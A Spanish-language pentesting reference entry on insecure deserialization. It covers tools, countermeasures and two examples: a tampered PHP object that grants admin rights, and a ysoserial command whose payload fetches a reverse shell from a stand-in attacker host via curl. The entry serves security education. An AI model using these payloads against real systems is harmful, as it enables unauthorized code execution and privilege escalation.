---
title: Análisis de Insecure Deserialization
slug: analisis-deserialization
aliases: [Insecure Deserialization, Object Injection, Deserialization Attack, Java deserialization, ysoserial, CommonsCollections, rO0AB, .NET deserialization]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Avanzada
mitre: [T1190]
related: [explotacion-deserialization, analisis-ssti]
learning_refs: [portswigger/deserialization-modifying-serialized-objects]
---

# Análisis de Insecure Deserialization

## Descripción
La deserialización insegura ocurre cuando una aplicación utiliza datos controlados por el usuario para reconstruir objetos en memoria sin una validación adecuada. Un atacante puede manipular los datos serializados para instanciar clases inesperadas, ejecutar métodos mágicos y, en muchos casos, lograr la ejecución remota de código (RCE) o escalada de privilegios.

## Herramientas
- **ysoserial** / **ysoserial.net** — herramientas para generar payloads de deserialización para Java y .NET.
- **PHPGGC** — herramienta para generar cadenas de gadgets para explotar la deserialización en aplicaciones PHP.

## Comandos / Ejemplos

### Manipulación de objeto PHP serializado
```php
# Objeto original: O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:0;}
# Objeto manipulado para escalada de privilegios:
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

### Generación de payload RCE para Java
```bash
# Generación de payload usando la cadena de gadgets CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/revshell' | base64
# El resultado se envía en una cookie o parámetro vulnerable
```

## Contramedidas
- No deserializar datos provenientes de fuentes no confiables.
- Implementar controles de integridad (ej. firmas HMAC) en los datos serializados.
- Utilizar formatos de serialización que no permitan la instanciación de clases arbitrarias (como JSON o XML de forma estricta).

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
